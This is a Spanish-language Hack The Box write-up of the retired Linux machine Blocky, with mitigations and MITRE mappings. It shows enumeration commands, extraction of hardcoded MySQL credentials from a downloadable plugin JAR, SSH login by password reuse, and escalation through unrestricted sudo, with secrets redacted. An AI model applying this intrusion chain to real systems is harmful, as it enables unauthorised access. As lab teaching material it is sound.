---
machine: Blocky
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, wordpress, jar, credentials, sudo]
---

# Blocky — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Blog de WordPress con un FTP que no permite anónimo. En `/plugins/` hay dos JAR de un plugin de Minecraft; uno de ellos, `BlockyCore.jar`, lleva usuario y contraseña de MySQL escritos en el bytecode. La contraseña está reutilizada para el usuario del blog, así que se entra por SSH como `notch`. `sudo -l` muestra `(ALL : ALL) ALL`: root directo.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
21/tcp  ftp   ProFTPD 1.3.5a
22/tcp  ssh   OpenSSH 7.2p2 Ubuntu
80/tcp  http  Apache httpd 2.4.18 → blocky.htb
```

```bash
echo "<IP> blocky.htb" | sudo tee -a /etc/hosts
```

El FTP rechaza el anónimo; el puerto 8192 aparece cerrado en algún escaneo y no aporta nada.

## Enumeración

```bash
whatweb http://blocky.htb
gobuster dir -u http://blocky.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 40
```

```text
/index.php           (301)
/plugins/            (200)
/readme.html         (200)
/wp-admin/           (301)
/wp-login.php        (200)
```

En `/plugins/` hay dos ficheros:

```text
BlockyCore.jar                 (883 B)
griefprevention-1.11.2-3.1.1.298.jar
```

El pequeño es el interesante: es un plugin propio del administrador.

```bash
wget http://blocky.htb/plugins/BlockyCore.jar
unzip -l BlockyCore.jar
strings BlockyCore.jar | grep -Ei 'pass|user|jdbc|mysql'
```

```text
sqlUser: root
sqlPass: <password>
jdbc:mysql://localhost:3306/...
```

Si `strings` no basta, `jadx` o `cfr` descompilan la clase:

```bash
jadx -d out BlockyCore.jar && grep -rn "sqlPass" out
```

Enumeración de usuarios de WordPress:

```bash
curl -s -I "http://blocky.htb/?author=1" | grep -i location
# /index.php/author/notch/
```

## Foothold

La contraseña de MySQL está reutilizada en el sistema:

```bash
ssh notch@blocky.htb
# contraseña: <password>
```

## Escalada

```bash
sudo -l
```

```text
User notch may run the following commands on blocky:
    (ALL : ALL) ALL
```

```bash
sudo su
# root
```

No hay más: el usuario está en sudoers sin restricciones.

## Evidencia

- `whoami` → `notch`, después `root`.
- `strings` sobre el JAR mostrando el campo de contraseña (redactado).
- Lectura de `user.txt` y `root.txt` (redactados).

## Lecciones aprendidas

- Los plugins y JAR propios son código de terceros sin revisar: credenciales en claro dentro del bytecode son habituales.
- `strings` resuelve en segundos lo que un descompilador tarda más; probar primero lo barato.
- `/?author=1` sigue siendo la forma más rápida de enumerar usuarios en WordPress.
- La reutilización de la contraseña de la base de datos como contraseña del sistema es el puente real entre el hallazgo y la shell.
- `(ALL : ALL) ALL` no deja nada que explotar: es root administrativo.

## Mitigaciones y detección

- No empaquetar credenciales en artefactos distribuibles; usar variables de entorno o un gestor de secretos.
- Rotar la contraseña de la base y no reutilizarla en cuentas del sistema.
- Restringir sudo por comando y usuario, no `ALL`.
- Deshabilitar la enumeración de autores en WordPress (`?author=`), o al menos no filtrar el login.
- Detección: descargas de JAR desde el webroot, `strings`/descompiladores en el host, logins SSH con la cuenta del blog.
- MITRE: T1552.001 (credenciales en ficheros), T1078, T1548.003.

## Referencias

- MITRE ATT&CK: T1552.001, T1548.003.
- Documentación de WordPress sobre enumeración de autores.
